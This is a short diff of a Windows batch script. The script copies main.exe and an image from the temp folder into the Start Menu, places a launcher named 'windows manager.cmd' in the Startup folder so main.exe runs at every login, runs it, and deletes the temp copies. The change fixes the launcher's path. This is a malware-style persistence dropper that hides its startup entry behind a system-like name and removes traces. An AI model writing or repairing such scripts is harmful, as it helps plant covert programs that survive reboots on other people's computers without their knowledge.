@@ -5,7 +5,7 @@ cd %AppData%\Microsoft\Windows\Start Menu\Programs
 COPY %TEMP%\img.png
 COPY %TEMP%\main.exe
 cd Startup
-echo ^cd .. ^&^& ^Start ^main^.^exe > "windows manager.cmd"
+echo ^cd "%AppData%\Microsoft\Windows\Start Menu\Programs" ^&^& ^Start ^main^.^exe > "windows manager.cmd"
 "windows manager.cmd"
 cd %TEMP%
 DEL img.png
